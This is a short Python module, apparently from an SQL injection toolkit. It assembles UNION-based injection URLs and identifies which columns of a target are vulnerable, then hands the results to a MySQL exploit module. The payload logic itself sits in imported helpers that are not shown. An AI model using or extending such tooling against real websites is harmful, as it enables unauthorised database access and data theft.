"""
    - created on march/27/2019
    - author topcodermc
    -- [ description of this module:
        create commands for union base attack then return what columns that we can use for injection
    ]
"""

try:

    from .CreateUrlPhrase import makeurl
    from .GetVulnColumns import GetVulnerableColumns

except Exception:
    raise SystemExit


def CreateCommands(url=None, columns=0, bypass=None, database=None, character=None):

    """
        exploitTools['urlFace']
        exploitTools['numbers']
    """
    exploitTools = makeurl(
        url=url, columns=columns, character=character
    )

    # step 1 => Get vulnerable columns number
    '''
    exploitedBy['payload']
    exploitedBy['vulnColumns']
    '''
    exploitedBy = GetVulnerableColumns(exploitTools['urlFace'], exploitTools['numbers'])

    outPutResults = dict()

    outPutResults['vulnColumns'] = exploitedBy['vulnColumns']
    outPutResults['urlFace'] = exploitedBy['payload']

    return outPutResults  # send them to UnionBase.py (/modules/exploit/classicmethods/mysql/UnionBase.py)
